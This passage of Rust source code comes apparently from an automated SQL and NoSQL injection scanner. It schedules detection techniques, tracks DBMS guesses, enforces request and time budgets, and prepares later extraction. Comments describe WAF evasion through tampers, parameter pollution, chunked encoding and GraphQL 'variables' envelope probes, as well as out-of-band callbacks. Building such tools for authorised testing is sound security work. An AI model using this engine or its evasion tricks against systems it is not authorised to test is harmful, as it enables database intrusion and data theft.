                    "second-order: second-order stored marker reflected confirm=second-pass param={} revisit_hash={revisit_hash} store_hash={store_url_hash}",
                    param.key(),
                );
                let finding = Finding::new(
                    target.as_str(),
                    param.key(),
                    TechniqueKind::Union,
                    0.85,
                    evidence,
                )
                .with_false_positive_prob(0.15)
                .with_waf(baseline.waf_vendor.clone(), baseline.is_waf_blocking());
                self.state.write().await.push_finding(finding);
                info!(
                    param=%self.scrubber.scrub(&param.key()),
                    "second-order stored marker reflected (2/2 revisits)"
                );
            } else {
                debug!(
                    param=%self.scrubber.scrub(&param.key()),
                    hits,
                    "second-order revisit miss"
                );
            }
        }
        info!("second-order active done");
        Ok(())
    }
}

/// Shared immutable detection inputs cloned once per `run_detection`.
#[derive(Debug, Clone)]
struct DetectionShared {
    target: TargetUrl,
    target_str: String,
    marker_set: MarkerSet,
    baseline: baseline::Baseline,
    tampers: Vec<Tamper>,
    context: InjectionContext,
    dbms_belief: DbmsBelief,
    /// Adaptive context probes already spent (`<=8` by `MAX_CONTEXT_PROBES`):
    /// seeded into every per-parameter scheduler budget.
    context_probes: usize,
    /// Shared detection clock for `--max-duration` (Phase 3): set once in
    /// `run_detection`, read in every `run_detection_for_param` iteration.
    /// Starts AFTER baseline + context, so `--max-duration` covers detection
    /// loops only — never the total run (documented in `--help`).
    started: Instant,
}

/// CLI technique name for a [`TechniqueKind`].
const fn technique_config_name(kind: TechniqueKind) -> &'static str {
    match kind {
        TechniqueKind::Boolean => "boolean",
        TechniqueKind::Error => "error",
        TechniqueKind::Time => "time",
        TechniqueKind::Union => "union",
        TechniqueKind::Stacked => "stacked",
        TechniqueKind::Json => "json",
        TechniqueKind::Nosql => "nosql",
        TechniqueKind::Oob => "oob",
    }
}

/// `true` when `--techniques` enables `kind` (or `"all"`).
fn is_technique_enabled(configured: &[String], kind: TechniqueKind) -> bool {
    let name = technique_config_name(kind);
    configured.iter().any(|t| t == name || t == "all")
}

/// Tamper-set label for trace `mutation_plan` (names only, never payloads).
/// `[]` → `"none"`, else comma-joined (`space2comment,randomcase`).
fn mutation_plan_label(tampers: &[Tamper]) -> String {
    if tampers.is_empty() {
        return "none".to_owned();
    }
    tampers
        .iter()
        .map(super::super::techniques::tamper::Tamper::name)
        .collect::<Vec<_>>()
        .join(",")
}

/// Context-aware creation order (simple `if`s): JSON context seeds `json`
/// then `nosql` first, ORDER BY context seeds `union` early. This only shapes
/// priors via `compute_calibrated_prior` (EVI input); execution order is
/// decided by the scheduler score afterwards, never by this fixed order.
fn detection_order(context: &InjectionContext) -> [TechniqueKind; 8] {
    use TechniqueKind as K;
    if context.json {
        [
            K::Json,
            K::Nosql,
            K::Boolean,
            K::Error,
            K::Time,
            K::Union,
            K::Stacked,
            K::Oob,
        ]
    } else if context.order_by {
        [
            K::Boolean,
            K::Union,
            K::Error,
            K::Time,
            K::Stacked,
            K::Json,
            K::Nosql,
            K::Oob,
        ]
    } else {
        [
            K::Boolean,
            K::Error,
            K::Time,
            K::Union,
            K::Stacked,
            K::Json,
            K::Nosql,
            K::Oob,
        ]
    }
}

/// JSON scan payloads: direct `json_payloads_for` first, then the GraphQL
/// `variables`-envelope probes (P0-2).
///
/// The envelope probes reuse the same TRUE/FALSE/error shape with the SQL
/// breakout riding inside `"variables"` instead of the query text, so WAFs
/// keyed on `query:` miss them while vulnerable resolvers still interpolate
/// them. Appended last (never first) so L1 (`take(2)`) stays byte-identical
/// to the historical direct sweep and `mutation_base_payload` (`.first()`)
/// keeps pointing at a direct probe.
fn json_scan_payloads(label: Option<&str>) -> Vec<JsonPayload> {
    let mut out = json_payloads_for(label);
    out.extend(graphql_probes_for(label));
    out
}

/// DBMS label for `*_payloads_for(Some(..))` once the belief is actionable.
///
/// Returns `Some("mysql" | "postgres" | "mssql" | "oracle" | "sqlite")` when the top
/// candidate reaches the `0.85` fill threshold (same bar as the early
/// `fill_missing_dbms` in `run_internal`), else `None` (generic polyglots).
/// Threaded into every `test_*_bounded` so quote/comment styles stay
/// quote-correct for the suspected engine instead of spraying generics.
fn dbms_payload_label(belief: &DbmsBelief) -> Option<&'static str> {
    let (kind, prob) = belief.top_candidate();
    if prob < 0.85 {
        return None;
    }
    match kind {
        crate::dbms::common::DbmsKind::MySql => Some("mysql"),
        crate::dbms::common::DbmsKind::Postgres => Some("postgres"),
        crate::dbms::common::DbmsKind::MsSql => Some("mssql"),
        crate::dbms::common::DbmsKind::Oracle => Some("oracle"),
        crate::dbms::common::DbmsKind::Sqlite => Some("sqlite"),
        crate::dbms::common::DbmsKind::Unknown => None,
    }
}

/// Parse a `Finding.dbms` string back to [`crate::dbms::common::DbmsKind`]
/// so a confirmed technique can promote the hypothesis belief for the next
/// tour (see `apply_outcome_to_hypothesis`). Returns `None` for missing or
/// unrecognized labels (never panics on operator-controlled evidence).
fn parse_finding_dbms(label: Option<&str>) -> Option<crate::dbms::common::DbmsKind> {
    let v = label?.trim().to_ascii_lowercase();
    match v.as_str() {
        "mysql" | "mariadb" => Some(crate::dbms::common::DbmsKind::MySql),
        "postgres" | "postgresql" | "pgsql" => Some(crate::dbms::common::DbmsKind::Postgres),
        "mssql" | "sqlserver" | "sql-server" | "tsql" => Some(crate::dbms::common::DbmsKind::MsSql),
        "oracle" | "ora" => Some(crate::dbms::common::DbmsKind::Oracle),
        "sqlite" => Some(crate::dbms::common::DbmsKind::Sqlite),
        _ => None,
    }
}

/// Quote-aware boolean payload order: L1 only tries the first 2 entries, so
/// the inferred [`QuoteContext`] must lead. Numeric bare contexts
/// (`quote=None + numeric`) move the `1 AND/OR …` pair first, double-quote
/// contexts move the `"` pair first, paren contexts move the `)` family
/// first; single-quote (the default head polyglot) keeps historical order.
/// Deterministic, no RNG on this path.
fn order_boolean_by_context(
    payloads: &mut [crate::techniques::boolean::payloads::BooleanPayload],
    context: &InjectionContext,
) {
    use crate::dbms::context::QuoteContext as Q;
    let leading: fn(&str) -> bool = match context.quote {
        Q::DoubleQuote => |s: &str| s.starts_with('"'),
        Q::Parenthesis => |s: &str| s.starts_with(')'),
        Q::None if context.numeric => |s: &str| s.starts_with('1'),
        _ => return,
    };
    let mut front = 0usize;
    let mut i = 0usize;
    while i < payloads.len() {
        if leading(payloads[i].true_payload.as_str()) {
            payloads.swap(front, i);
            front += 1;
        }
        i += 1;
    }
}

/// Quote-aware ORDER BY prefix for union enumeration: the inferred quote
/// context leads so `order_by` sinks confirm with the historical 10-probe
/// budget instead of burning a full prefix cycle. Unknown contexts keep the
/// historical single-quote prefix (byte-identical default); the UNION
/// payloads themselves stay polyglot (`'\"())) …`) so column-count inference
/// never loses coverage, only the enumeration prefix is quote-correct.
fn order_by_prefix_for_context(context: &InjectionContext) -> &'static str {
    use crate::dbms::context::QuoteContext as Q;
    match context.quote {
        Q::DoubleQuote => "\"",
        Q::Parenthesis => ")",
        Q::None if context.numeric => "",
        _ => "'",
    }
}

/// Build the per-parameter [`Scheduler`] ordered by EVI/cost (knowledge-neutral
/// when `config.knowledge` is `None`).
///
/// Insertion order follows `hyps` (itself seeded by [`detection_order`], so
/// `json`-first / `order_by` only shape priors via `compute_calibrated_prior`,
/// never the execution order afterwards). Heap tie-break by insertion id keeps
/// the order deterministic per `--seed` (no RNG on this path).
/// `context_probes` (the `<=8` adaptive probes) is seeded into the budget so
/// `budget_spent`/`budget_total`/`next_best_probe` account the global cost,
/// and the [`EarlyStop`] is explicitly reset for the new parameter
/// (inter-param isolation for the N1/N2 `<=25 req` veto).
///
/// C13 : avec `config.knowledge = Some(store)`, chaque hypothèse reçoit
/// `boost = store.boost_for_context(technique, dbms, context)` (`1.0` neutre
/// sous `MIN_SAMPLES`, `[0.5,1.5]` sinon, clamp scheduler `[0.5,2.0]`
/// conservé). Avec `None` (défaut OFF), `boost = None` → `1.0` neutre,
/// **byte-identique** au comportement historique (`score == evi / cost`,
/// aucune lecture/écriture disque).
///
/// Phase 3 : `mean_ms` (baseline TTFB) module le coût `time` via
/// [`cost_for_with_ttfb`] (`mean <= 2000` ou `0` = coût statique inchangé,
/// byte-identique). Seul le canal lent `time` est gonflé sur cible lente
/// (les différentiels rapides gardent leur priorité).
///
/// PR20 — pourquoi `oob`/`stacked` restent statiques (choix volontaire,
/// pas d'extension) : seul `time` parque un permit du pool isolé
/// `TIME_POOL_SLOTS` pendant toute la sonde (jitter + retries inclus) avec
/// un timeout de classe 15s — sur cible lente (mean 5s) une sonde `sleep 5s`
/// bloque ~10s + risque timeout, son score EVI/coût doit chuter face aux
/// différentiels bon marché. `oob` attend le collaborateur en async
/// (`oob_wait_secs`, défaut 5s, classe `oob` sans permit `time`) : sa latence
/// est bornée par le poll, pas par le TTFB cible. `stacked` tourne en classe
/// `Default` (latence statique 0.5s, coût = risque retry, pas blocage TTFB).
/// Gonfler aussi `oob` (EVI 0.4) / `stacked` (EVI 0.5) les affamerait sur
/// cibles lentes (jamais schedulés) sans bénéfice mesuré — le
/// `scheduler_ttfb_static_by_default_and_dynamic_when_slow` couvre le
/// comportement `time`-only.
fn build_scheduler_for_param(
    config: &EngineConfig,
    param_key: &str,
    hyps: &[Hypothesis],
    context_probes: usize,
    mean_ms: f64,
) -> Scheduler {
    let mut scheduler = Scheduler::new(
        RequestBudget::new(config.budget.request_budget, None),
        EarlyStop::default(),
    );
    scheduler.early_stop_mut().reset_for_new_param();
    if context_probes > 0 {
        scheduler
            .budget_mut()
            .record_request(param_key, context_probes);
    }
    for hyp in hyps {
        if !is_technique_enabled(&config.techniques, hyp.technique) {
            continue;
        }
        let evi = evi_for(hyp.technique, hyp.posterior);
        let base = cost_for(hyp.technique);
        let cost = if hyp.technique == TechniqueKind::Time {
            cost_for_with_ttfb(base, mean_ms)
        } else {
            base
        };
        // C13 : OFF (`None`) = `None` → boost neutre 1.0, byte-identique.
        // ON = boost `1+alpha` (`alpha<=0.5`, `[0.5,1.5]`) puis clamp final
        // `[0.5,2.0]` via `scheduled_boost_for` (jamais de veto).
        let knowledge_boost: Option<f64> = config.knowledge.as_ref().map(|ks| {
            let dbms_label = if let Some(hint) = config.dbms_hint.as_deref() {
                normalize_dbms(hint).to_owned()
            } else {
                let (kind, _) = hyp.dbms_belief.top_candidate();
                normalize_dbms(&kind.to_string()).to_owned()
            };
            scheduled_boost_for(Some(ks), hyp.technique, &dbms_label, &hyp.context).unwrap_or(1.0)
        });
        debug!(
            param = param_key,
            technique = %hyp.technique,
            posterior = hyp.posterior,
            evi,
            cost,
            knowledge_boost = ?knowledge_boost,
            "scheduler scored technique"
        );
        scheduler.push(
            param_key,
            hyp.technique,
            technique_config_name(hyp.technique),
            evi,
            cost,
            knowledge_boost,
        );
    }
    scheduler
}

/// One-line scheduler visibility: `budget_spent` / `budget_total` /
/// `next_best_probe` for stealth budgets (C4).
fn log_scheduler_state(scheduler: &Scheduler, param_key: &str, stage: &str) {
    if let Some(probe) = scheduler.next_best_probe() {
        debug!(
            param = param_key,
            stage,
            budget_spent = scheduler.budget_spent(),
            budget_total = ?scheduler.budget_total(),
            next_technique = %probe.technique,
            next_score = probe.score,
            queued = scheduler.len(),
            "scheduler state"
        );
    } else {
        debug!(
            param = param_key,
            stage,
            budget_spent = scheduler.budget_spent(),
            budget_total = ?scheduler.budget_total(),
            queued = scheduler.len(),
            "scheduler state (empty)"
        );
    }
}

/// Per-parameter C3+C4 loop: 7 hypotheses seeded by calibrated priors, each
/// `test_*_bounded` outcome mapped to probe/trial/WAF updates. Findings stay
/// untouched; prune/confirm only gate logging + early skip of terminal hyps.
///
/// [`detection_order`] only sets the creation order so the JSON / ORDER BY
/// context feeds priors (EVI input), while execution follows scheduler
/// `score = EVI * 1.0 / cost` via [`Scheduler::pop`] (budget + [`EarlyStop`]
/// gated). Payload volume per technique stays enveloped by
/// `payload_budget(level, ..)` inside `test_*_bounded`.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn run_detection_for_param(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
) {
    if cancel.is_cancelled() {
        return;
    }
    let param_key = param.key();
    let mut hyps: Vec<Hypothesis> = detection_order(&shared.context)
        .iter()
        .map(|kind| {
            Hypothesis::new(
                param_key.clone(),
                *kind,
                shared.dbms_belief.clone(),
                shared.context.clone(),
            )
        })
        .collect();
    let mut scheduler = build_scheduler_for_param(
        config,
        &param_key,
        &hyps,
        shared.context_probes,
        shared.baseline.mean_ms,
    );
    log_scheduler_state(&scheduler, &param_key, "start");
    let mut executed_kinds: Vec<TechniqueKind> = Vec::with_capacity(hyps.len());
    // Live belief: starts as the adaptive `<=8`-probe belief, then any
    // confirmed technique with a DBMS label (`>= 0.85` bar, same as
    // `fill_missing_dbms`) promotes it for the *next* tour on this param.
    // Payload selection reads `live_shared` (not the frozen `shared`), so
    // quote/comment styles stay quote-correct without re-spraying generics.
    let mut live_shared = shared.clone();
    while let Some(probe) = scheduler.pop() {
        if cancel.is_cancelled() {
            break;
        }
        // Phase 3 `--max-duration`: budget temps global partagé (voir
        // `DetectionShared::started`). `None` = illimité, byte-identique.
        if BudgetConfig::is_over_max_duration(shared.started, config.budget.max_duration_secs) {
            warn!(
                param = param_key,
                max_duration_secs = ?config.budget.max_duration_secs,
                "max-duration exceeded, stopping detection early"
            );
            break;
        }
        // CODE calibration `--request-budget`: plafond global OPT-IN sur le
        // `request_count` partagé (les schedulers sont per-param : seul ce
        // compteur global borne le total N1/N2). `None` = illimité,
        // byte-identique (le helper court-circuite sans lock supplémentaire
        // au-delà de ce `read`). Coopératif : la technique en cours finit,
        // aucune nouvelle ne démarre, fin en `Done` propre (ni erreur, ni
        // finding inventé). Un léger dépassement reste possible sous
        // concurrence (un tour par param en vol).
        {
            let spent = state.read().await.request_count();
            if BudgetConfig::is_over_request_budget(spent, config.budget.request_budget) {
                warn!(
                    param = param_key,
                    request_budget = ?config.budget.request_budget,
                    requests = spent,
                    "request-budget exceeded, stopping detection early"
                );
                break;
            }
        }
        let Some(hyp) = hyps.iter_mut().find(|h| h.technique == probe.technique) else {
            continue;
        };
        // Never prune before the first probe: OOB prior (0.02) starts below
        // the refuted threshold but still deserves its gated run.
        if hyp.cost_spent > 0 && hyp.is_refuted() {
            debug!(param = param_key, technique = %hyp.technique, posterior = hyp.posterior, "hypothesis pruned, skipping technique");
            continue;
        }
        if hyp.cost_spent > 0 && hyp.is_terminal() {
            continue;
        }
        // Per-family veto streak: a new technique family starts with a fresh
        // negative counter, so the N1/N2 veto only *arms* on a single
        // family spending >= 25 negative requests — and `Scheduler::pop`
        // additionally gates enforcement on a full pass (B1), so an armed
        // veto never blocks never-attempted families (boolean-negative !=
        // nosql-negative; cross-family starvation would be a silent false
        // negative). `confirmed` survives (only `reset_for_new_param`
        // clears it).
        scheduler.early_stop_mut().reset_negative_streak();
        let before_cost = hyp.cost_spent;
        run_one_technique(
            client,
            state,
            cancel,
            config,
            &live_shared,
            raw_request,
            param,
            hyp,
        )
        .await;
        executed_kinds.push(probe.technique);
        let spent_delta = hyp.cost_spent.saturating_sub(before_cost).max(1);
        let confirmed = hyp.is_confirmed();
        let refuted = hyp.is_refuted();
        let posterior = hyp.posterior;
        let technique = hyp.technique;
        let trials = hyp.trials_passed;
        let (top_kind, top_prob) = hyp.dbms_belief.top_candidate();
        scheduler.record_outcome(&param_key, confirmed, spent_delta);
        // `>= 0.85` DBMS promotion becomes the prior for the next tour:
        // live payload belief + pending hypotheses + stored findings.
        if confirmed && top_prob >= 0.85 && top_kind != crate::dbms::common::DbmsKind::Unknown {
            live_shared.dbms_belief = hyp.dbms_belief.clone();
            for pending in hyps.iter_mut().filter(|h| h.cost_spent == 0) {
                pending.dbms_belief = live_shared.dbms_belief.clone();
            }
            state.write().await.fill_missing_dbms(top_kind);
        }
        if confirmed {
            debug!(param = param_key, technique = %technique, posterior, trials, "hypothesis confirmed");
        } else if refuted {
            debug!(param = param_key, technique = %technique, posterior, "hypothesis refuted (posterior <= 0.04)");
        }
    }
    // Starvation guard: `union` keeps >= 1 probe when enabled, even if the
    // score order truncated it away. Skipped once the global `--request-budget`
    // is spent (le plafond gagne sur la couverture ; l'épuisement per-param
    // implique l'épuisement global car le total partagé majore tout total
    // per-param, donc un seul test global suffit), and once `--max-duration`
    // is exceeded (a hard user time budget must never be silently overshot:
    // a single L2 union run can park ~100 req / ~100s on a slow target, as
    // seen live when detection ran 205s under `--max-duration 120`).
    // NOTE: the EarlyStop veto is intentionally NOT consulted here — the
    // guard's contract is union coverage even on vetoed params (the veto
    // still kills error/time/json/nosql/oob/stacked, saving the bulk).
    let union_enabled = is_technique_enabled(&config.techniques, TechniqueKind::Union);
    let pre_guard_len = executed_kinds.len();
    ensure_union_starvation_guard(&mut executed_kinds, union_enabled);
    let budget_spent = BudgetConfig::is_over_request_budget(
        state.read().await.request_count(),
        config.budget.request_budget,
    );
    let duration_spent =
        BudgetConfig::is_over_max_duration(shared.started, config.budget.max_duration_secs);
    if budget_spent {
        debug!(
            param = param_key,
            request_budget = ?config.budget.request_budget,
            "request-budget spent, skipping union starvation guard"
        );
    } else if duration_spent {
        warn!(
            param = param_key,
            max_duration_secs = ?config.budget.max_duration_secs,
            "max-duration exceeded, skipping union starvation guard"
        );
    } else if executed_kinds.len() > pre_guard_len
        && !cancel.is_cancelled()
        && let Some(hyp) = hyps
            .iter_mut()
            .find(|h| h.technique == TechniqueKind::Union && h.cost_spent == 0)
    {
        debug!(
            param = param_key,
            "union starvation guard: forcing >=1 union probe"
        );
        run_one_technique(
            client,
            state,
            cancel,
            config,
            &live_shared,
            raw_request,
            param,
            hyp,
        )
        .await;
        scheduler.record_outcome(&param_key, hyp.is_confirmed(), hyp.cost_spent.max(1));
    }
    // Visibilité du plafond OPT-IN : le scheduler per-param est seedé avec la
    // même valeur (`budget_total`), donc son épuisement confirme l'arrêt sur
    // budget (le `warn!` global ci-dessus a déjà annoncé le stop). `None` =
    // `is_exhausted()` toujours faux : 0 log, chemin inchangé.
    if scheduler.budget().is_exhausted() {
        info!(
            param = param_key,
            request_budget = ?config.budget.request_budget,
            spent = scheduler.budget_spent(),
            "request-budget exhausted for param, detection stopped early (clean Done)"
        );
    }
    log_scheduler_state(&scheduler, &param_key, "done");
}

/// Dispatch one technique, snapshot findings/requests, fold the outcome into
/// `hyp` via `record_probe/record_trial/record_waf_penalty`.
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn run_one_technique(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
    hyp: &mut Hypothesis,
) {
    let kind = hyp.technique;
    let before_findings = state.read().await.findings().len();
    let before_requests = state.read().await.request_count();
    if matches!(
        kind,
        TechniqueKind::Boolean | TechniqueKind::Error | TechniqueKind::Time | TechniqueKind::Union
    ) {
        dispatch_probe_first_half(
            client,
            state,
            cancel,
            config,
            shared,
            raw_request,
            param,
            kind,
        )
        .await;
    } else {
        dispatch_probe_second_half(
            client,
            state,
            cancel,
            config,
            shared,
            raw_request,
            param,
            kind,
        )
        .await;
    }
    let snapshot = state.read().await;
    let new_findings: Vec<Finding> = snapshot
        .findings()
        .iter()
        .skip(before_findings)
        .filter(|f| f.parameter == param.key() && f.technique == kind)
        .cloned()
        .collect();
    let after_requests = snapshot.request_count();
    drop(snapshot);
    // `request_count` is `u64`, costs are `usize`: saturate on 32-bit targets.
    #[allow(clippy::cast_possible_truncation)]
    let cost = after_requests
        .saturating_sub(before_requests)
        .min(usize::MAX as u64) as usize;
    apply_outcome_to_hypothesis(hyp, kind, &new_findings, cost.max(1), &shared.baseline);
    // C6 trace: one summary record per (param, technique) — hashes only, no
    // clear payload/body. `mutation_plan` cites the effective tamper set so
    // `--explain` / replay can attribute cost without storing secrets.
    {
        let plan = mutation_plan_label(&shared.tampers);
        let mut st = state.write().await;
        let seq = st.next_trace_seq();
        let req_hash = crate::reasoning::trace::hash_str_hex(&format!(
            "{}:{}:{}:{}",
            param.key(),
            kind,
            plan,
            config.seed.map_or("none".to_owned(), |s| s.to_string())
        ));
        let resp_hash = crate::reasoning::trace::hash_str_hex(&format!(
            "{}:{}:findings={}",
            param.key(),
            kind,
            new_findings.len()
        ));
        #[allow(clippy::cast_precision_loss)]
        let cost_f = cost.max(1) as f64;
        st.push_trace(crate::reasoning::ProbeRecord::new(
            seq,
            param.key(),
            kind.to_string(),
            plan,
            config.seed,
            req_hash,
            resp_hash,
            hyp.posterior.clamp(0.0, 1.0),
            cost_f,
        ));
    }
}

/// First half of the technique dispatch (boolean/error/time/union).
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn dispatch_probe_first_half(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
    kind: TechniqueKind,
) {
    let opts = ProbeOpts::new(config.evasion.hpp, config.evasion.chunked);
    let raw = raw_request.as_ref().as_ref();
    // Shared `--max-duration` deadline for the long per-technique loops
    // (boolean payloads, ORDER BY enumeration, union matrix): a single
    // technique must not silently overshoot an explicit user budget.
    // `None` = unlimited, historical behaviour byte-identical.
    let deadline =
        BudgetConfig::detection_deadline(shared.started, config.budget.max_duration_secs);
    match kind {
        TechniqueKind::Boolean => {
            test_boolean_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
                deadline,
            )
            .await;
        }
        TechniqueKind::Error => {
            let boolean_enabled = is_technique_enabled(&config.techniques, TechniqueKind::Boolean);
            test_error_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                boolean_enabled,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Time => {
            test_time_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Union => {
            test_union_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
                deadline,
            )
            .await;
        }
        _ => {}
    }
}

/// Second half of the technique dispatch (stacked/json/nosql/oob).
#[allow(clippy::too_many_arguments, clippy::too_many_lines)]
async fn dispatch_probe_second_half(
    client: &HttpClient,
    state: &Arc<RwLock<SessionState>>,
    cancel: &CancellationToken,
    config: &EngineConfig,
    shared: &DetectionShared,
    raw_request: &Arc<Option<RawRequest>>,
    param: &TargetParameter,
    kind: TechniqueKind,
) {
    let opts = ProbeOpts::new(config.evasion.hpp, config.evasion.chunked);
    let raw = raw_request.as_ref().as_ref();
    match kind {
        TechniqueKind::Stacked => {
            test_stacked_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Json => {
            test_json_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        TechniqueKind::Nosql => {
            test_nosql_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.seed,
                &shared.context,
            )
            .await;
        }
        TechniqueKind::Oob => {
            test_oob_bounded(
                client,
                state,
                cancel,
                &shared.target,
                &shared.target_str,
                param,
                &shared.baseline,
                &shared.marker_set,
                raw,
                &shared.tampers,
                opts,
                &config.evasion.payload_opts,
                &config.matcher,
                config.budget.level,
                &config.net.ignore_codes,
                config.oob.oob_domain.clone(),
                config.oob.oob_poll_url.clone(),
                config.oob.oob_wait_secs,
                config.seed,
                &shared.context,
                &shared.dbms_belief,
            )
            .await;
        }
        _ => {}
    }
}

/// Fold a technique outcome into `hyp`. `Finding`s are untouched; only the
/// belief moves. Unconfirmed error hits stay probe-only (no trial) so they
/// can never reach the `>= 0.85 + trial` confirmed state.
/// A confirmed DBMS label (`fill_missing_dbms` bar: `>= 0.85`) also promotes
/// `hyp.dbms_belief` for the next tour: the following technique on the same
/// parameter selects quote-correct, engine-specific payloads instead of
/// re-spraying generics.
fn apply_outcome_to_hypothesis(
    hyp: &mut Hypothesis,
    kind: TechniqueKind,
    new_findings: &[Finding],
    cost: usize,
    baseline: &baseline::Baseline,
) {
    if baseline.is_waf_blocking() {
        hyp.record_waf_penalty();
    }
    if new_findings.is_empty() {
        hyp.record_probe(false, 0.0, cost);
        return;
    }
    let unconfirmed_only = new_findings
        .iter()
        .all(|f| f.evidence.contains("unconfirmed"));
    let (signal, trials) = infer_signal_and_trials(kind, new_findings, unconfirmed_only);
    hyp.record_probe(true, signal, cost);
    for _ in 0..trials {
        hyp.record_trial(true);
    }
    if !unconfirmed_only {
        for finding in new_findings {
            if let Some(dbms_kind) = parse_finding_dbms(finding.dbms.as_deref()) {
                hyp.dbms_belief.update_with_signal(dbms_kind, 0.9);
                break;
            }
        }
    }
}

/// Default positive signal strength + confirming trials per technique.
/// `confirm_either` 3-trial logic lives inside the detectors and is unchanged;
/// one passed detector confirmation counts as one hypothesis trial here.
///
/// Provisional calibration (v0.5): `boolean`/`error` 0.9, `union` 0.85,
/// `time`/`stacked` 0.8 mirror the historical detector confidences
/// (`diff_against_baseline` 0.75/0.85 branches, 3-trial `confirm_either`).
/// Recalibrate against `bench/reports/history.jsonl` once 5+ runs per
/// scenario exist (`run.py compare --from v0.4`): `high` must hold precision
/// `>= 95%`, `medium >= 80%`, else adjust here and re-run the bench matrix.
fn infer_signal_and_trials(
    kind: TechniqueKind,
    new_findings: &[Finding],
    unconfirmed_only: bool,
) -> (f64, usize) {
    if unconfirmed_only {
        return (0.4, 0);
    }
    match kind {
        TechniqueKind::Boolean | TechniqueKind::Error => (0.9, 1),
        TechniqueKind::Time | TechniqueKind::Stacked => (0.8, 1),
        TechniqueKind::Union => (0.85, 1),
        TechniqueKind::Json | TechniqueKind::Nosql => {
            let boolean_channel = new_findings
                .iter()
                .any(|f| f.evidence.contains("channel=boolean"));
            if boolean_channel { (0.9, 1) } else { (0.75, 1) }
        }
        TechniqueKind::Oob => (1.0, 1),
    }
}

impl Engine {
    /// Passive DBMS guess from error findings + banner regex, filling any
    /// missing `dbms` on boolean/time findings.
    /// Recovers the injection point of the first *confirmed* finding (param
    /// name + location parsed back out of `finding.parameter`), falling back
    /// to the first finding then to a synthetic `id` query param when there
    /// is no finding yet. Shared by fingerprint/extraction/enumeration, which
    /// all reuse the same confirmed injection point.
    async fn first_finding_param(&self, target: &TargetUrl) -> (TargetParameter, TargetUrl) {
        let st = self.state.read().await;
        let findings = st.findings().to_vec();
        drop(st);
        // Prefer a confirmed finding so an `0.55 unconfirmed` error never
        // dictates the oracle injection point when a confirmed finding exists.
        let f = findings
            .iter()
            .find(|x| is_confirmed_finding(x))
            .or_else(|| findings.first())
            .cloned();
        if let Some(finding) = f {
            // Recover param from finding.parameter "name@location" (e.g., "id@query", "user@body", "X-Header@header:X-Header").
            // Split at the LAST '@': parameter names may contain '@' (e.g. email-like
            // query keys) while locations (`query`/`body`/`cookie`/`header:<name>`)
            // never do — HTTP header names (RFC 9110 `token`) exclude '@' and ':'.
            let (name, loc_str) = match finding.parameter.rsplit_once('@') {
                Some((n, l)) => (n.to_owned(), l.to_owned()),
                None => (finding.parameter.clone(), "query".to_owned()),
            };
            let location = if loc_str == "query" {
                ParameterLocation::Query
            } else if loc_str == "body" {
                ParameterLocation::Body
            } else if loc_str == "cookie" {
                ParameterLocation::Cookie
            } else if let Some(h) = loc_str.strip_prefix("header:") {
                ParameterLocation::Header(h.to_owned())
            } else {
                // Fallback: treat any unknown as Query, but preserve marker handling via name prefix
                ParameterLocation::Query
            };
            (TargetParameter::new(name, location, "1"), target.clone())
        } else {
            // fallback synthetic
            (
                TargetParameter::new("id", ParameterLocation::Query, "1"),
                target.clone(),
            )
        }
    }

    /// Passive DBMS guess from error findings + banner regex; if both are
    /// inconclusive, falls back to one active differential probe per
    /// candidate DBMS (see [`crate::dbms::common::DbmsDetector::fingerprint_probe`]),
    /// stopping at the first confirmation. Only runs at all when there is
    /// already a confirmed finding — no extra requests on a clean target.
    #[allow(clippy::too_many_arguments)]
    async fn run_fingerprint(
        &self,
        target: &TargetUrl,
        target_str: &str,
